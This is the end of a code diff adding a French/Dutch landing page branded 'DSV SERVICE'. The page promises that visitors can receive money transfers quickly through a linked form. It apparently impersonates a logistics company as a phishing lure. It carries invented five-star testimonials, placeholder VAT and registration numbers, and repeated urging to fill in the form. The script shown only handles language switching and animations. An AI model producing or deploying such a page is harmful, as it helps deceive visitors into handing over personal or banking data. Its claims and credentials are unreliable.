+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15 15 0 010 20M12 2a15 15 0 000 20"/></svg></div>
+        <h3><span class="fr">Couverture globale</span><span class="nl">Wereldwijde dekking</span></h3>
+        <p><span class="fr">Tous les types de virements acceptés, partout en Europe.</span><span class="nl">Alle soorten overschrijvingen geaccepteerd, overal in Europa.</span></p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg></div>
+        <h3><span class="fr">Accompagnement expert</span><span class="nl">Deskundige begeleiding</span></h3>
+        <p><span class="fr">Une équipe d'experts disponible 24h/24 et 7j/7 à votre service.</span><span class="nl">Een team van experts, 24/7 tot uw dienst.</span></p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg></div>
+        <h3><span class="fr">Simple et rapide</span><span class="nl">Eenvoudig en snel</span></h3>
+        <p><span class="fr">Un formulaire clair, complété en 3 minutes. C'est tout.</span><span class="nl">Een duidelijk formulier, in 3 minuten ingevuld. Dat is alles.</span></p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Showcase -->
+<section class="showcase">
+  <div class="container">
+    <div class="section-head reveal">
+      <span class="eyebrow"><span class="fr">Expertise</span><span class="nl">Expertise</span></span>
+      <h2 class="section-title">
+        <span class="fr">Un leader logistique en Europe</span>
+        <span class="nl">Een logistiek leider in Europa</span>
+      </h2>
+      <p class="section-desc">
+        <span class="fr">Une infrastructure solide et un réseau éprouvé au service de vos transferts.</span>
+        <span class="nl">Een solide infrastructuur en een beproefd netwerk voor uw overschrijvingen.</span>
+      </p>
+    </div>
+    <div class="images-grid">
+      <div class="image-card reveal">
+        <img src="dsv-image1.jpg" alt="DSV logistique" loading="lazy" decoding="async">
+        <div class="caption"><span class="fr">Infrastructure européenne</span><span class="nl">Europese infrastructuur</span></div>
+      </div>
+      <div class="image-card reveal">
+        <img src="dsv-image2.png" alt="DSV réseau global" loading="lazy" decoding="async">
+        <div class="caption"><span class="fr">Réseau mondial connecté</span><span class="nl">Verbonden wereldwijd netwerk</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Testimonials -->
+<section>
+  <div class="container">
+    <div class="section-head center reveal">
+      <span class="eyebrow"><span class="fr">Témoignages</span><span class="nl">Getuigenissen</span></span>
+      <h2 class="section-title">
+        <span class="fr">Ils nous font confiance</span>
+        <span class="nl">Zij vertrouwen ons</span>
+      </h2>
+    </div>
+    <div class="testimonials-grid">
+      <div class="testimonial reveal">
+        <div class="stars">★★★★★</div>
+        <p><span class="fr">« Rapide, sécurisé et transparent. Exactement ce dont j'avais besoin. »</span><span class="nl">„Snel, veilig en transparant. Precies wat ik nodig had."</span></p>
+        <div class="testimonial-author">Jean M. <span class="testimonial-role">— CEO</span></div>
+      </div>
+      <div class="testimonial reveal">
+        <div class="stars">★★★★★</div>
+        <p><span class="fr">« Le meilleur service. Un support réactif 24/7. Je recommande vivement. »</span><span class="nl">„De beste service. Reactieve 24/7 ondersteuning. Sterk aanbevolen."</span></p>
+        <div class="testimonial-author">Marie L. <span class="testimonial-role">— <span class="fr">Indépendante</span><span class="nl">Zelfstandige</span></span></div>
+      </div>
+      <div class="testimonial reveal">
+        <div class="stars">★★★★★</div>
+        <p><span class="fr">« Aucune attente, aucune complication. Juste mon argent en quelques minutes. »</span><span class="nl">„Geen wachttijd, geen gedoe. Gewoon mijn geld in enkele minuten."</span></p>
+        <div class="testimonial-author">Thomas B. <span class="testimonial-role">— <span class="fr">PME</span><span class="nl">KMO</span></span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Final CTA -->
+<section class="cta-final" id="formulaire">
+  <div class="cta-content reveal">
+    <h2>
+      <span class="fr">Prêt à recevoir votre argent ?</span>
+      <span class="nl">Klaar om uw geld te ontvangen?</span>
+    </h2>
+    <p>
+      <span class="fr">Remplissez le formulaire maintenant. C'est gratuit, rapide et 100% sécurisé.</span>
+      <span class="nl">Vul nu het formulier in. Gratis, snel en 100% veilig.</span>
+    </p>
+    <a href="./formulaire.html" class="btn btn-primary">
+      <span class="fr">Accéder au formulaire</span>
+      <span class="nl">Naar het formulier</span>
+    </a>
+  </div>
+</section>
+
+<footer>
+  <img src="dsv-logo.svg" alt="DSV"><br>
+  <div>© 2026 DSV SERVICE. <span class="fr">Tous droits réservés.</span><span class="nl">Alle rechten voorbehouden.</span></div>
+  <div>Bedrijvenzone Machelen Cargo 829/A, 1830 Machelen (<span class="fr">Belgique</span><span class="nl">België</span>)</div>
+  <div>TVA / BTW: BE 1234.567.890 – RPR / KBO: 1234.567.890</div>
+  <div class="footer-links">
+    <a href="#"><span class="fr">Mentions légales</span><span class="nl">Wettelijke kennisgeving</span></a> –
+    <a href="#"><span class="fr">Politique de confidentialité</span><span class="nl">Privacybeleid</span></a>
+  </div>
+</footer>
+
+<script>
+function setLang(lang) {
+  document.documentElement.lang = lang;
+  document.querySelectorAll('.lang-toggle button').forEach(function (b) { b.classList.remove('active'); });
+  var btn = document.querySelector('[data-lang="' + lang + '"]');
+  if (btn) btn.classList.add('active');
+  document.body.classList.toggle('lang-nl', lang === 'nl');
+  try { localStorage.setItem('dsv-lang', lang); } catch (e) {}
+}
+
+try {
+  var savedLang = localStorage.getItem('dsv-lang');
+  if (savedLang === 'fr') setLang('fr');
+} catch (e) {}
+
+// Sticky header state
+(function () {
+  var header = document.getElementById('siteHeader');
+  function onScroll() {
+    header.classList.toggle('scrolled', window.scrollY > 40);
+  }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+})();
+
+// Scroll reveal + stat counters (with graceful fallback)
+(function () {
+  var items = document.querySelectorAll('.reveal');
+
+  function animateCount(el) {
+    if (el.dataset.done) return;
+    el.dataset.done = '1';
+    var target = parseInt(el.dataset.count, 10);
+    var prefix = el.dataset.prefix || '';
+    var suffix = el.dataset.suffix || '';
+    var locale = document.body.classList.contains('lang-nl') ? 'nl-BE' : 'fr-BE';
+    var dur = 1400, start = null;
+    function step(ts) {
+      if (!start) start = ts;
+      var p = Math.min((ts - start) / dur, 1);
+      var eased = 1 - Math.pow(1 - p, 3);
+      el.textContent = prefix + Math.round(target * eased).toLocaleString(locale) + suffix;
+      if (p < 1) requestAnimationFrame(step);
+    }
+    requestAnimationFrame(step);
+  }
+
+  function reveal(el) {
+    el.classList.add('visible');
+    el.querySelectorAll('[data-count]').forEach(animateCount);
+  }
+
+  if (!('IntersectionObserver' in window)) {
+    items.forEach(reveal);
+    return;
+  }
+
+  var io = new IntersectionObserver(function (entries) {
+    entries.forEach(function (entry) {
+      if (!entry.isIntersecting) return;
+      reveal(entry.target);
+      io.unobserve(entry.target);
+    });
+  }, { threshold: 0.12 });
+
+  items.forEach(function (el) { io.observe(el); });
+})();
+</script>
 </body>
 </html>
